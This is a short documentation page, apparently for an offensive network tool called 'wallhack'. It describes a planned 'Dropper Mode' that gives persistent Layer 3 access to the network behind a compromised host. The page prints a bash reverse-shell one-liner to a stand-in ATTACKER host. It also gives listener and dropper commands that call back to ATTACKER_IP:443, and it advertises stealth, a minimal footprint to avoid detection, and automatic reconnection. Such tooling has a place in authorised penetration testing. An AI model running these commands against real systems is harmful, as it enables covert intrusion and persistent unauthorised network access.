# Dropper Mode

{% badge text="Coming Soon" variant="secondary" /%} {% badge text="Experimental" variant="outline" /%}

{% callout type="warning" title="Conceptual Feature" %}
Dropper Mode is currently a concept under active discussion. The implementation details and user experience are subject to significant change. Participate in the discussion on [GitHub](https://github.com/block65/wallhack/discussions/10).
{% /callout %}

Establish reverse tunnels as simply as reverse shells. Drop, execute, and gain instant network access.

### Comparison

**Traditional reverse shell** — command prompt on the target host only.
```bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1
```

**Dropper mode** — Layer 3 access to the entire network behind the target.
```bash
wallhack-drop ATTACKER:443
```

## Features

- **Single Command Deployment:** Execute once to establish a persistent tunnel.
- **Automatic Reconnection:** Retry logic maintains connectivity through network instability.
- **Minimal Footprint:** Optimized binary size and low resource usage to avoid detection.
- **Stealth Operation:** Blends with HTTPS traffic on common ports.

## Planned Usage

{% steps %}
{% step title="Start Listener" number=1 %}
Configure the entry node to accept dropper connections.

{% codeblock code="wallhack --dropper-listen :443" title="Attacker machine" /%}
{% /step %}

{% step title="Deploy Binary" number=2 %}
Transfer and execute the dropper on the target.

{% codeblock code="wallhack-drop ATTACKER_IP:443" title="Target host" /%}
{% /step %}

{% step title="Automatic Setup" number=3 %}
Establish the tunnel automatically and configure routes.

**Result:** Persistent Layer 3 access to the target network.
{% /step %}
{% /steps %}

